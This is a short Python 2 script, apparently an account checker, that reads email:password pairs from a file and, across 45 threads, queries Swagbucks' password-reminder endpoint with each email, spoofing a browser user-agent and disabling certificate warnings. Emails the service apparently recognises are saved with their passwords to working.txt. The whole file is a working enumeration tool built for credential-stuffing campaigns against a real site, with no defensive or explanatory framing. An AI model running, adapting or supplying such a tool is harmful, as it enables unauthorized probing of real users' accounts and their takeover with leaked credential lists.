# -*- coding: utf-8 -*-
import requests
import re
import Queue
import codecs
from threading import Thread

requests.packages.urllib3.disable_warnings()


def check(q):
    while True:
        c = q.get()
        user = c.split(':')[0]
        passw = c.split(':')[1]
        work = False
        s = requests.session()
        headers = {
            'User-Agent': 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36',
            'Accept-Encoding': 'gzip',
			'Accept': 'application/json, text/plain, */*',
			'X-Requested-With': 'XMLHttpRequest',
			'Referer': 'http://www.swagbucks.com/p/login'
        }
        r = s.get(
                    'http://www.swagbucks.com/?cmd=sb-pswd-reminder&email=' + user,
                    verify=False,
                    headers=headers
                )
        if '2' in r.text:
            work = True
        if work:
            f = open("working.txt", "a")
            f.write('{0}:{1}\n'.format(user, passw))
            f.close()
            print user, 'works!'
        q.task_done()
    
def main():
    with codecs.open('accounts.txt', 'r', encoding='utf-8') as f:
        users = f.readlines()
        
    queue = Queue.Queue()
    
    for _ in range(int(45)):
        worker = Thread(target=check, args=(queue,))
        worker.start()
    for user in users:
        queue.put(user.strip().encode('ascii', 'ignore'))
            
if __name__ == '__main__':
    main()